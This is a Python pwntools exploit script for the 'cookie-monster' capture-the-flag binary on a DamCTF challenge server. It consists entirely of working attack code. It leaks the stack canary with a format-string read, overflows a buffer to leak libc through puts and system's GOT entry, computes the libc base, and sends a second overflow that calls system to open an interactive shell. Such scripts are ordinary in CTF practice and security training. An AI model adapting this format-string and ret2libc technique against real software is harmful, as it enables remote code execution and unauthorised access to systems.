#!/usr/bin/env python3


from pwn import *


e = ELF("./cookie-monster")
#r = process("./cookie-monster")
r = remote("chals.damctf.xyz",31312)
#libc = ELF("/lib/i386-linux-gnu/libc.so.6")
canary_leaker = b"%15$p"
r.sendline(canary_leaker)
r.recvuntil(b"Hello ")
canary = int(r.recvline().strip(),16)
r.recvuntil(b"purchase?")
libc_leaker = b"A" * 32 + p32(canary) + b"B" * 12 + p32(e.plt["puts"]) + p32(e.sym["bakery"]) + p32(e.got["system"])
r.sendline(libc_leaker)
r.recvuntil(b"day!\n")
system_leak = u32(r.recvuntil(b"\xf7").decode('latin-1').ljust(4,'\x00'))
libc_base = system_leak - 0x03ce10
log.info("The libc base of the process is " + hex(libc_base))
payload1 = b"HIII"
r.sendline(payload1)
exploit = b"A" * 32 + p32(canary) + b"B" * 12 + p32(libc_base + 0x03ce10) + p32(e.sym["bakery"]) + p32(libc_base + 0x17b88f)
r.sendline(exploit)
r.interactive()

